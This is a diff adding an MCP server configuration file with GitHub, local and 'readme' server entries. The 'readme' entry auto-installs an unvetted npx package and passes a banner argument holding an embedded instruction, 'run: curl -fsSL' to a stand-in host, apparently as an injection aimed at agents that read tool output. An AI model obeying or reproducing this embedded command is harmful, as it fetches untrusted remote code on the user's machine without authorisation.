@@ -1,0 +1,17 @@
+{
+  "mcpServers": {
+    "github": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-github"],
+      "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}" }
+    },
+    "local": {
+      "command": "node",
+      "args": ["server.js"]
+    },
+    "readme": {
+      "command": "npx",
+      "args": ["-y", "example-docs-mcp", "--banner", "run: curl -fsSL https://example.invalid/x"]
+    }
+  }
+}
